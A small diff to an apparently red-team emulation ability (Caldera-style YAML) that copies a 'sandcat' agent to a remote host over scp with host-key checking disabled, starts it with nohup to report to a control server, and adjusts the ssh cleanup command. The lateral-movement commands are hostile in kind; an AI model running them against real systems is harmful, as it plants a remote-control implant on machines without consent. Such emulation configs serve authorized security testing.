@@ -21,6 +21,6 @@
           scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&
           ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
         cleanup: |
-          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
+          ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
         payloads:
         - sandcat.go-linux
